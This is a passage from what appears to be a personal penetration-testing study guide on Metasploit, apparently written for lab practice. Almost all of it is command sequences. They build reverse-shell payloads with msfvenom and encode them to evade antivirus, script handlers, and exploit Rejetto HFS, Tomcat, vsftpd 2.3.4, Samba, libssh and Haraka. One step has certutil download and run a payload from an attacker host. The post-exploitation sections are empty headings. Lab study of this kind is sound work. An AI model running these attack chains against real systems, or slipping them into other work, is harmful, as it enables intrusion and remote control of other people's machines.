are far and few in between. Most EDR and XDR solutions use machine learning and AI nowadays, heuristic analysis
and runtime analysis.

Shellcode is a piece of code that is typically used as a payload for exploitation. It gets its name from the term
command shell, whereby shellcode is a piece of code that provides the attacker with a remote command shell on the
target system.

```bash
$ msfvenom --list encoders
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[ATTACKER_PORT] -f exe -o ~/payload.exe -e x86/shikata_ga_nai 
# this will encode the payload ONCE. 
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[ATTACKER_PORT] -f exe -o ~/payload.exe -e x86/shikata_ga_nai -i [ITERATIONS]
# this will encode the payload an N amount of times.
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[ATTACKER_PORT] -f elf -o ~/payload -e x86/shikata_ga_nai -i [ITERATIONS]
# same thing but for linux.
$ sudo systemctl start postgresql && msfdb init && msfconsole
msf6 > use multi/handler
# do the same as before. go pwn something!!!!!
```


<a id=5.3></a>
## Automating Metasploit with Resource Scripts

Resource scripts are a way to automatize stuff on the Metasploit Console. We could automate something simple like a single auxiliary
scan, or maybe an entire list of scans, or maybe all! It will depend on what we want to do with the scripts. 

The way to use them is quite simple. We can either take a "recording" of what we did on a console session and dump it. We can also
create our own, and luckily they work in a very similar way to Bash or Batch scripts.

```bash
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(scanner/http/http_version) > set RHOSTS [TARGET]
msf6 auxiliary(scanner/http/http_version) > set RPORT [PORT]
msf6 auxiliary(scanner/http/http_version) > run
msf6 auxiliary(scanner/http/http_version) > makerc megahax.rc
[*] Saving last 8 commands to megahax.rc ...
msf6 auxiliary(scanner/http/http_version) > exit
$ cat megahax.rc
use auxiliary/scanner/http/http_version
setg RHOSTS 192.168.1.1
setg RPORT 80
# as we can see, the resource script saves all our msfconsole commands.
$ ls -l /opt/metasploit/scripts/resource/ # For Arch
$ ls -l /usr/share/metasploit-framework/scripts/resource/ # For whatever else
# metasploit also comes with a few resource scripts ready to be used. lets create a script that will open a handler for us
$ echo "use multi/handler\nset payload [PAYLOAD]\nset LHOST [ATTACKER_IP]\nset LPORT [ATTACKER_PORT]\nrun" > handler.rc
# you would do this with an editor like vim or something. this is a very simple script.
# if you wanted to make something a little more complex or with added functionality, you can embed ruby into the resource script.
$ echo "use multi/handler\nset payload [PAYLOAD]\nset LHOST <ruby> myrubycode </ruby> [ATTACKER_IP]\nset LPORT [ATTACKER_PORT]\nrun" > ruby_handler.rc
# use the <ruby></ruby> tags.
# imo resource scripts should be called something like sequence scripts, because thats what they are at the end of the day, a sequence
# of commands :)
$ msfconsole -r handler.rc # this way we can open the msfconsole and automatically execute our script.
```

<a id=6></a>
# Exploitation

<a id=6.1></a>
## Windows Exploitation

<a id=6.1.1></a>
### Exploiting an HTTP File Server

...I will not explain what an HTTP file server. It's an HTTP service that works as a file server... directory listing, webdav, you know.

This lab is a funny Rejetto HFS. 

```bash
$ sudo systemctl start postgresql && msfconsole
msf6 > workspace -a HFS
msf6 > setg RHOSTS [TARGET]
msf6 > setg RHOST [TARGET]
msf6 > db_nmap -sS -O -sV [TARGET] 
msf6 > search type:exploit name:rejetto
msf6 > use exploit/windows/http/rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > run
meterpreter > sysinfo # :)
meterpreter > exit
msf6 exploit(windows/http/rejetto_hfs_exec) > set paylaod windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST [ATTACKER_IP]
msf6 exploit(windows/http/rejetto_hfs_exec) > set LPORT [ATTACKER_PORT]
msf6 exploit(windows/http/rejetto_hfs_exec) > run
```

<a id=6.1.2></a>
### Exploiting SMB

Yes, yes, Eternalblue. MS17-010. What else could it be? Also, I ain't explaining what SMB is either, because if you're here you're supposed
to know what all of this is. If you don't, read the previous shit I uploaded. I love you :)

I will skip over this because we've already seen how to exploit this vulnerability and in great depth on the 
Host and network Pentesting: Host-based Attacks/WINDOWS_README.md. So go check that out.

<a id=6.1.3></a>
### Exploiting WinRM

This too is on the Host and network Pentesting: Host-based Attacks/WINDOWS_README.md file and well explained. Go there, please? Pretty please?

Although I will list some useful Metasploit modules.

- Auxiliary: winrm_auth_methods
- Auxiliary: winrm_cmd
- Auxiliary: winrm_login
- Auxiliary: winrm_wql
- Exploit: winrm_script_exec > Get yourself some creds before using this... and FORCE_VBS my friend!

<a id=6.1.4></a>
### Exploiting Tomcat

This... this isn't there. Or anywhere really. So lets check it.

Apache Tomcat is a FOSS Java servlet web server. It works like a typical web server, although it usually runs on port 8080 by default, but
it can be changed. 

The main differences between Apache and Apache Tomcat is that one is used to host static or dynamic webpages or web apps developed in PHP, while
the other is used to host websites or web applications developed in Java.

We'll manhandle a Tomcat server version 8.5.19> which is vulnerable to a JSP payload to execute a RCE vulnerability.

```bash
msf6 > workspace -a Tomcat
msf6 > setg RHOSTS [TARGET]
msf6 > setg RHOST [TARGET]
msf6 > db_nmap -sS -sV -O [TARGET]
msf6 > searc type:exploit tomcat_jsp
msf6 > use exploit/multi/http/tomcat_jsp_upload_bypass
msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > set RPORT [PORT]
msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > show targets
msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > set target [TARGET]
msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > set payload java/jsp_shell_bind_tcp
msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > set SHELL [SHELL]
msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > run
# background the session asap... we cant upgrade our session, but we can make a msfvenom payload
# and get a new session through the multi/handler. lets open a new terminal.
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[ATTACKER_PORT] -f exe -o met.exe
# now we need to upload this to the target... we can use an http server.
$ python -m http.server 80
# lets go back to the msfconsole...
msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > sessions 1
C:\> certutil -urlcache -f http://[ATTACKER_IP]/met.exe
# lets get back to the other terminal
$ msfconsole
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST [ATTACKER_IP]
msf6 exploit(multi/handler) > set LPORT [ATTACKER_PORT]
msf6 exploit(multi/handler) > run
# now lets go back to the cmd session...
C:\> .\met.exe
# and a meterpreter has been created...
```

<a id=6.2></a>
## Linux Exploitation

<a id=6.2.1></a>
### Exploiting FTP

We know what FTP is.

Main attack vectors:

- Bruteforce attack
- Anonymous sessions
- Inherent vulnerabiliites :) *wink wink*

In the lab we exploit vsftpd 2.3.4, the happy version of vsftpd.

```bash
msf6 > workspace -a FTP
msf6 > setg RHOSTS [TARGET]
msf6 > setg RHOST [TARGET]
msf6 > db_nmap -sS -sV -O [TARGET]
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
# we get a session if the service is indeed backdoored. lets upgrade the shell. first run /bin/bash -i.
# i tried to run the post module for like half an hour like a dumbass, i had to run bash on the session first :<
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > set LHOST [ATTACKER_IP]
msf6 post(multi/manage/shell_to_meterpreter) > set LPORT [ATTACKER_PORT]
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION [SESSION_ID]
msf6 post(multi/manage/shell_to_meterpreter) > run
# if everything goes well. then we're good to go.
```

We can also exploit this vulnerability manually due to its backdoor nature. The way we exploit this vulnerability is by
logging into the vsftpd with telnet and login in with \[user\]+:) and any password. The payload in this case is the smiley face.
Before doing that, we need to get a netcat instance ready to go and connect to the [TARGET_IP]:[PORT]

<a id=6.2.2></a>
### Exploiting Samba

Samba = SMB for teh FOSS enjoyers.

```bash
msf6 > workspace -a Samba
msf6 > setg RHOST [TARGET]
msf6 > setg RHOSTS [TARGET]
msf6 > search type:exploit name:samba
msf6 > use exploit/linux/samba/is_known_pipename
msf6 exploit(linux/samba/is_known_pipename) > check
# this will run an auxiliary module to check if the target is vulnerable or not. it lies sometimes. beware.
msf6 exploit(linux/samba/is_known_pipename) > run
# you get a shell session. fuck that. run /bin/bash -i and ctrl+z
msf6 exploit(linux/samba/is_known_pipename) > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION [SESSION_ID]
msf6 post(multi/manage/shell_to_meterpreter) > set LHOST [ATTACKER_IP]
msf6 post(multi/manage/shell_to_meterpreter) > set LPORT [ATTACKER_PORT]
msf6 post(multi/manage/shell_to_meterpreter) > set payload linux/x86/meterpreter/reverse_tcp
# not needed, but it makes me feel safe.
msf6 post(multi/manage/shell_to_meterpreter) > run
```

<a id=6.2.3></a>
### Exploiting SSH

SSH is a secure shell yes.  Libssh (SSH C library) version 0.6.0-0.8.0 is vulnerable to an authentication bypass.
It's like a rev2libc, but more in the lines of rev2telnet.

```bash
msf6 > workspace -a RevToTelnet
msf6 > setg RHOSTS [TARGET]
msf6 > setg RHOST [TARGET]
msf6 > search libssh_auth_bypass
msf6 > use auxiliary/scanner/ssh/libssh_auth_bypass
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > set RPORT [PORT]
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > set SPAWN_PTY true
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > run
# we get a ssh session on the bag. 
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > set LHOST [ATTACKER_IP]
msf6 post(multi/manage/shell_to_meterpreter) > set LPORT [ATTACKER_PORT]
msf6 post(multi/manage/shell_to_meterpreter) > set payload linux/x86/meterpreter/reverse_tcp
msf6 post(multi/manage/shell_to_meterpreter) > run
# we got a meterpreter session les goooo!!
```

Something I just learnt:

```bash
# It looks to me that using the post/multi/manage/shell_to_meterpreter is pointless and kind of a waste of time.
# maybe im wrong. but using the following accomplishes the same goal:
msf6 > sessions -u 1
# this will upgrade your shell to meterpreter :)
```

<a id=6.2.4></a>
### Exploiting SMTP

SMTP = mail go brrrrr. EHLO :)

SMTP runs on port 25, 465 or 587. It can be on any of these ports.

We will be exploiting the Haraka SMTP service with version 2.8.9>.

```bash
msf6 > worspace -a SMTP
msf6 > setg RHOST [TARGET]
msf6 > setg RHOSTS [TARGET]
msf6 > db_nmap -sV -sS -O [TARGET]
msf6 > search name:haraka
msf6 > use exploit/linux/smtp/haraka
msf6 exploit(linux/smtp/haraka) > set email_to [VALID_EMAIL_RECEIVER] (root@attackdefense.test)
msf6 exploit(linux/smtp/haraka) > set email_from [EMAIL_SENDER]
msf6 exploit(linux/smtp/haraka) > set payload linux/x64/meterpreter_reverse_http
msf6 exploit(linux/smtp/haraka) > set LHOST [ATTACKER_IP]
msf6 exploit(linux/smtp/haraka) > set LPORT [ATTACKER_PORT]
msf6 exploit(linux/smtp/haraka) > run
```

<a id=7></a>
# Post-Exploitation

<a id=7.1></a>
## Post-exploitation Fundamentals

<a id=7.1.1></a>
### Meterpreter Fundamentals

<a id=7.1.2></a>
### Upgrading Shells

<a id=7.2></a>
## Windows Post-exploitation

<a id=7.3></a>
## Linux Post-exploitation

